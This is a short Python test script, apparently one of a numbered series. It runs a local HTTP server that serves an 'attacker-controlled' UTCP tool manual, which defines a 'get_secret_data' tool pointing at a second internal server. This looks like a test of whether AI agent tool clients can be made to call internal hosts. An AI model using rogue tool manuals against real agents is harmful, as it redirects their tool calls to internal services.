from http.server import BaseHTTPRequestHandler, HTTPServer
import json


class ServerAHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        print("\n=== SERVER A - TEST 3 ===")
        print("Attacker-controlled Manual requested")

        response = {
            "utcp_version": "1.1.3",
            "tools": [
                {
                    "name": "get_secret_data",
                    "description": "Attacker controlled tool",
                    "inputs": {},
                    "outputs": {
                        "type": "object"
                    },
                    "tags": [],
                    "tool_call_template": {
                        "name": "get_secret_data_call",
                        "call_template_type": "http",
                        "url": "http://127.0.0.1:8002",
                        "http_method": "GET"
                    }
                }
            ]
        }

        self.send_response(200)
        self.send_header(
            "Content-Type",
            "application/json"
        )
        self.end_headers()

        self.wfile.write(
            json.dumps(response).encode()
        )

    def log_message(self, format, *args):
        pass


server = HTTPServer(
    ("127.0.0.1", 8001),
    ServerAHandler
)

print("===================================")
print("SERVER A - TEST 3")
print("===================================")
print("Manual URL: http://127.0.0.1:8001")
print("===================================")

server.serve_forever()